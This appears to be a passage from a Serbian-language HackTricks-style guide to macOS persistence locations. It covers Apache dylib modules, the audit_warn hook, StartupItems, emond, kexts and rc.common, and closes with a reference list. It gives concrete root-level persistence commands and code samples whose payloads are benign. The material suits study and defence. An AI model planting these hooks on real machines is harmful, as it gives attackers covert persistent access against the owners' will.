#### Opis i Exploit

U `/etc/apache2/httpd.conf` možete navesti učitavanje modula dodavanjem linije kao što je:<sup>[32]</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Na ovaj način će vaš kompajlirani modul biti učitan u Apache. Jedino je potrebno da ga ili **potpišete važećim Apple sertifikatom** ili da **dodate novi pouzdani sertifikat** u sistem i **potpišete ga** tim sertifikatom.

Zatim, ako je potrebno, da biste bili sigurni da će server biti pokrenut, možete izvršiti:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Primer koda za Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
- Ali morate biti root, auditd mora biti pokrenut i mora izazvati upozorenje
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/etc/security/audit_warn`**
- Potreban je root
- **Okidač**: Kada auditd detektuje upozorenje

#### Opis i exploit

Kad god auditd detektuje upozorenje, skripta **`/etc/security/audit_warn`** se **izvršava**. Zato možete dodati svoj payload u nju.<sup>[33]</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Možete prinudno prikazati upozorenje pomoću `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Ovo je zastarelo, tako da u tim direktorijumima ne bi trebalo ništa da bude pronađeno.**

**StartupItem** je direktorijum koji treba da se nalazi u okviru `/Library/StartupItems/` ili `/System/Library/StartupItems/`. Kada se ovaj direktorijum kreira, mora da sadrži dve određene datoteke:

1. **rc script**: shell script koji se izvršava prilikom pokretanja sistema.
2. **plist file**, konkretno nazvan `StartupParameters.plist`, koji sadrži različita podešavanja konfiguracije.

Uverite se da su i **rc script** i datoteka `StartupParameters.plist` pravilno smešteni unutar direktorijuma **StartupItem**, kako bi ih proces pokretanja sistema prepoznao i koristio.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ne mogu da pronađem ovu komponentu u svom macOS-u, pa za više informacija pogledajte writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Uveo ga je Apple, **emond** je mehanizam za logging za koji se čini da je nedovoljno razvijen ili možda napušten, ali je i dalje dostupan. Iako nije naročito koristan za Mac administratora, ova opskurna usluga mogla bi da posluži kao suptilan metod persistence za threat actors, koji bi verovatno prošao neprimećeno kod većine macOS admina.<sup>[34]</sup>

Onima koji znaju za njegovo postojanje, prepoznavanje bilo kakve zlonamerne upotrebe **emond** je jednostavno. LaunchDaemon sistema za ovu uslugu traži skripte za izvršavanje u jednom direktorijumu. Za proveru ovoga može se koristiti sledeća komanda:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Lokacija

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Potreban je root
- **Okidač**: Uz XQuartz

#### Opis i Exploit

XQuartz se **više ne instalira u macOS**, pa za više informacija pogledajte writeup.<sup>[3]</sup>

### ~~kext~~

> [!CAUTION]
> Instaliranje kext-a je toliko komplikovano čak i kada imate root privilegije da ga neću smatrati načinom za escape iz sandbox-a ili čak za persistence (osim ako imate exploit)

#### Lokacija

Da bi se KEXT instalirao kao startup item, mora biti **instaliran na jednoj od sledećih lokacija**:

- `/System/Library/Extensions`
- KEXT fajlovi ugrađeni u OS X operativni sistem.
- `/Library/Extensions`
- KEXT fajlovi koje instalira third-party software

Trenutno učitane kext fajlove možete izlistati pomoću:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Za više informacija o [**kernel ekstenzijama pogledajte ovaj odeljak**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Lokacija

- **`/usr/local/bin/amstoold`**
- Root required

#### Opis i Exploitation

Izgleda da je `plist` iz `/System/Library/LaunchAgents/com.apple.amstoold.plist` koristio ovaj binary dok je izlagao XPC service... problem je bio u tome što binary nije postojao, pa je bilo moguće postaviti nešto na tu lokaciju i, kada se pozove XPC service, vaš binary bi bio pozvan.<sup>[35]</sup>

Ovo više ne mogu da pronađem u svom macOS-u.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Lokacija

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root required
- **Trigger**: Kada se service pokrene (retko)

#### Opis i exploit

Izgleda da se ova skripta ne pokreće često, a nisam mogao da je pronađem ni u svom macOS-u, pa za više informacija pogledajte writeup.<sup>[36]</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Ovo ne funkcioniše u modernim verzijama MacOS-a**

Takođe je moguće ovde postaviti **commands koji će se izvršiti prilikom pokretanja.** Primer obične rc.common skripte:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tehnike i alati za persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Reference

- [1] [2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Beyond the good ol' LaunchAgents - 1 - datoteke za pokretanje shell-a](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Beyond the good ol' LaunchAgents - 18 - X11 i XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Beyond the good ol' LaunchAgents - 21 - Ponovo otvorene aplikacije](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Beyond the good ol' LaunchAgents - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Beyond the good ol' LaunchAgents - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Beyond the good ol' LaunchAgents - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Beyond the good ol' LaunchAgents - 22 - LoginHook i LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Beyond the good ol' LaunchAgents - 4 - cron poslovi](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Beyond the good ol' LaunchAgents - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Beyond the good ol' LaunchAgents - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Beyond the good ol' LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Beyond the good ol' LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Beyond the good ol' LaunchAgents - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Beyond the good ol' LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Beyond the good ol' LaunchAgents - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Folder Actions for Persistence on macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Beyond the good ol' LaunchAgents - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Beyond the good ol' LaunchAgents - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Beyond the good ol' LaunchAgents - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analiza persistence mehanizma „Mac File Opener“ (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Beyond the good ol' LaunchAgents - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Saving Your Access: Screensavers for macOS Persistence (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Beyond the good ol' LaunchAgents - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Beyond the good ol' LaunchAgents - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Beyond the good ol' LaunchAgents - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Beyond the good ol' LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Beyond the good ol' LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Persistent Credential Theft with Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Beyond the good ol' LaunchAgents - 30 - man konfiguraciona datoteka - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Beyond the good ol' LaunchAgents - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Beyond the good ol' LaunchAgents - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Beyond the good ol' LaunchAgents - 23 - emond, demon za nadgledanje događaja](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
